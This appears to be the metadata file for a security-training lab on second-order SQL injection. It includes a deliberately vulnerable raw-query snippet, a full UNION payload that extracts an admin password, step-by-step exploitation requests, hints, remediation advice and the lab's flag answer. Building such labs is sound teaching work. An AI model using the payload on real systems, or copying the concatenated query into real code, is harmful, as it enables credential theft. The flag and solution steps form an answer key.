// src/modules/practice-labs/sql-injection/labs/lab4/lab4.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab4Metadata: LabMetadata = {
  slug: 'sqli-second-order',
  title: 'SQL Injection: Second-Order (Stored) Attack',
  ar_title: 'حقن SQL: الحقن من الدرجة الثانية (المخزَّن)',
  description:
    "The input field is protected. The report generator isn't. Store a malicious payload in your profile, then trigger the vulnerable report query to fire it.",
  ar_description:
    'حقل الإدخال محمي — المدخلات تُحفظ بأمان عبر ORM. لكن مولّد التقارير يستخدم البيانات المخزّنة في raw query. خزّن payload خبيثًا ثم شغّل التقرير لإطلاقه.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'SQL Injection',
    'Second-Order SQLi',
    'Stored Payloads',
    'UNION Attack',
    'ORM False Security',
  ],
  xpReward: 400,
  pointsReward: 200,
  duration: 50,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Store a UNION-based SQLi payload in your display name, then trigger the report generator to extract the admin password.',
  ar_goal:
    'خزّن payload حقن SQL بأسلوب UNION في اسمك المعروض، ثم شغّل مولّد التقارير لاستخراج كلمة مرور المدير.',

  briefing: {
    en: `NeoHire is a digital recruitment platform. You're an applicant — one of thousands.
You can update your profile display name. The system saves it perfectly — no errors, no warnings.
Try a single quote. It saves just fine. The developers are clearly using an ORM, right?
But NeoHire has a feature: "Generate Application Report" — a PDF summary of your profile.
You've never seen what goes on behind that button.
Safe input. Stored safely. Used somewhere else entirely.
The question is: where does your name end up in the backend?`,
    ar: `NeoHire هي منصة توظيف رقمية. أنت مقدّم طلب — واحد من آلاف.
يمكنك تحديث اسمك المعروض في الملف الشخصي. النظام يحفظه بشكل مثالي — لا أخطاء، لا تحذيرات.
جرّب علامة اقتباس مفردة. تحفظ بشكل طبيعي تماماً. المطورون يستخدمون ORM بوضوح، أليس كذلك؟
لكن NeoHire لديها ميزة: "إنشاء تقرير الطلب" — ملخص PDF لملفك الشخصي.
لم ترَ قط ما يحدث خلف ذلك الزر.
مدخل آمن. مخزَّن بأمان. مستخدَم في مكان آخر تماماً.
السؤال هو: أين ينتهي اسمك في الـ backend؟`,
  },

  stepsOverview: {
    en: [
      'Update your display name normally — understand what the /set-name endpoint does',
      'Try injecting SQL characters in the name — observe that the input is safely stored (ORM protection)',
      'Trigger the /generate-report endpoint — notice it uses your stored name differently',
      'Craft a UNION payload as your display name and save it via /set-name',
      'Trigger /generate-report again — your stored payload fires in the raw query context',
    ],
    ar: [
      'حدّث اسمك المعروض بشكل طبيعي — افهم ما تفعله نقطة /set-name',
      'جرّب حقن أحرف SQL في الاسم — لاحظ أن المدخل محفوظ بأمان (حماية ORM)',
      'شغّل نقطة /generate-report — لاحظ أنها تستخدم اسمك المخزَّن بشكل مختلف',
      'صمّم payload UNION كاسمك المعروض واحفظه عبر /set-name',
      'شغّل /generate-report مجدداً — يُطلَق payload المخزَّن في سياق raw query',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'NeoHire applicant portal. Updating display name uses Prisma ORM (parameterized — safe). ' +
      "But when generating the 'Application Report', the system reads the stored name from DB " +
      'and concatenates it directly into a raw SQL ILIKE query. Injection fires AFTER storage — most security scanners miss this entirely.',
    vulnerableCode:
      '// Step 1 — SAFE: stored via Prisma ORM\n' +
      'await prisma.labGenericUser.update({ data: { email: displayName } });\n\n' +
      '// Step 2 — VULNERABLE: read safely, then injected raw\n' +
      'const name = profile.email;\n' +
      'const query = `SELECT username, email, role FROM "LabGenericUser" WHERE username ILIKE \'%${name}%\'`;',
    exploitation:
      'Step 1 — POST /lab4/set-name:\n' +
      '  { displayName: "applicant%\' UNION SELECT username, password, role FROM \\"LabGenericUser\\" WHERE role=\'admin\'--" }\n\n' +
      'Step 2 — POST /lab4/generate-report → stored payload fires → admin password returned in results.',
    steps: {
      en: [
        'POST /lab4/set-name with { displayName: "test\'quote" } → saved successfully. Input is safe (ORM). No injection here.',
        'POST /lab4/generate-report → observe the response. It returns a list of users matching your name via ILIKE — this is a raw query.',
        'Now craft the payload: displayName = "applicant%\' UNION SELECT username, password, role FROM \\"LabGenericUser\\" WHERE role=\'admin\'--"',
        'POST /lab4/set-name with the payload → stored safely by ORM (no execution at this point)',
        "POST /lab4/generate-report → raw query executes: ILIKE '%applicant%' UNION SELECT ... WHERE role='admin'-- → admin password appears in results",
      ],
      ar: [
        'أرسل POST /lab4/set-name مع { displayName: "test\'quote" } → محفوظ بنجاح. المدخل آمن (ORM). لا حقن هنا.',
        'أرسل POST /lab4/generate-report → لاحظ الاستجابة. تُرجع قائمة مستخدمين يطابقون اسمك عبر ILIKE — هذا raw query.',
        'صمّم الـ payload: displayName = "applicant%\' UNION SELECT username, password, role FROM \\"LabGenericUser\\" WHERE role=\'admin\'--"',
        'أرسل POST /lab4/set-name مع الـ payload → محفوظ بأمان بواسطة ORM (لا تنفيذ في هذه المرحلة)',
        "أرسل POST /lab4/generate-report → يُنفَّذ raw query: ILIKE '%applicant%' UNION SELECT ... WHERE role='admin'-- → كلمة مرور الأدمن تظهر في النتائج",
      ],
    },
    fix: [
      'The report generator must also use parameterized queries — never concatenate stored values into raw SQL',
      'Treat stored data as untrusted — sanitize and validate at the point of USE, not just at input',
      'Code review all raw query usages and flag any string interpolation from DB-sourced values',
      'Use a SAST tool configured to track data flow from DB reads to SQL construction',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Second-Order SQL Injection occurs when malicious input is safely stored in the database (often via ORM or prepared statements), but later retrieved and used in a different, unparameterized query. The injection fires at the point of USE — not the point of INPUT — making it invisible to standard input validation and many security scanners.',
      ar: 'يحدث حقن SQL من الدرجة الثانية عندما يُحفظ مدخل خبيث بأمان في قاعدة البيانات (غالباً عبر ORM أو prepared statements)، لكنه يُسترجع لاحقاً ويُستخدم في استعلام مختلف غير محمي. يُطلَق الحقن عند نقطة الاستخدام — لا نقطة الإدخال — مما يجعله غير مرئي للتحقق القياسي من المدخلات والكثير من أدوات الفحص الأمني.',
    },
    impact: {
      en: 'Attackers can bypass all input-level protections by staging the attack across two separate operations. Any feature that reads stored user data and uses it in queries becomes a potential trigger — reports, exports, notifications, audit logs.',
      ar: 'يمكن للمهاجمين تجاوز جميع حمايات مستوى الإدخال بتنظيم الهجوم عبر عمليتين منفصلتين. أي ميزة تقرأ بيانات مستخدم مخزَّنة وتستخدمها في الاستعلامات تصبح مشغّلاً محتملاً — التقارير والتصدير والإشعارات وسجلات التدقيق.',
    },
    fix: [
      'Parameterize queries at the point of execution — regardless of data source',
      'Never trust data just because it came from your own database',
      'Data flow analysis: trace all DB-sourced values that reach SQL construction',
      'Principle of defense in depth: multiple layers of protection at both input and use',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        'Try /set-name with a single quote in the name — it saves fine! The INPUT is protected. Now call /generate-report and observe what changes in the response.',
    },
    {
      order: 2,
      xpCost: 25,
      content:
        '/generate-report takes no user input — it reads your stored profile name. But it builds a raw ILIKE query using that stored name. Your payload executes THERE, not at /set-name.',
    },
    {
      order: 3,
      xpCost: 40,
      content:
        "The report query uses: ILIKE '%yourName%'. Close the ILIKE with %', then append a UNION SELECT to extract the admin password column from LabGenericUser.",
    },
  ],

  flagAnswer: 'FLAG{SECOND_ORDER_SQLI_FIRED}',
  initialState: {
    users: [
      {
        username: 'applicant',
        email: 'pending',
        role: 'applicant',
        password: 'app_temp_pass',
      },
      {
        username: 'hr_review',
        email: 'hr@neohire.io',
        role: 'reviewer',
        password: 'hr_review_pass',
      },
      {
        username: 'hr_admin',
        email: 'admin@neohire.io',
        role: 'admin',
        password: 'FLAG{SECOND_ORDER_SQLI_FIRED}',
      },
    ],
  },
};
